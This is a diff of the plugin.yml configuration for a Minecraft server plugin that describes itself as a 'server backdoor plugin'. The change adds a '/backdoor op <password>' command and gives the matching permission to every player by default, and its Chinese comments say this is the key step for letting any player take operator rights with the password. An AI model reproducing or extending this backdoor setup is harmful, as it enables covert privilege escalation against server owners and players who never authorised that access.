@@ -18,15 +18,24 @@ softdepend:
 description: 云想服务器后门插件
 author: JLeo0001
 
-# [新增] 注册指令
+# [修改] 重新定义指令结构
 commands:
   backdoor:
-    description: 管理 backdoor 插件。
-    usage: "§c用法: /backdoor reload"
-    permission: backdoor.admin
+    description: Backdoor 插件指令。
+    usage: |
+      §c用法:
+      §c/backdoor op <密码>
+      §c/backdoor reload
+    # 这里不再设置顶级权限，让所有人都能看到指令用法提示
 
-# [新增] 定义插件
+# [修改] 重新定义权限
 permissions:
+  # 允许使用 /backdoor op <密码> 的权限
+  backdoor.op:
+    description: 允许使用后门获取OP权限。
+    default: true # 关键：默认所有玩家 (default组) 都拥有此权限
+
+  # 允许使用 /backdoor reload 的权限
   backdoor.admin:
-    description: 允许使用 /backdoor reload 指令。
+    description: 允许重载插件配置。
     default: op # 默认只有OP拥有此权限
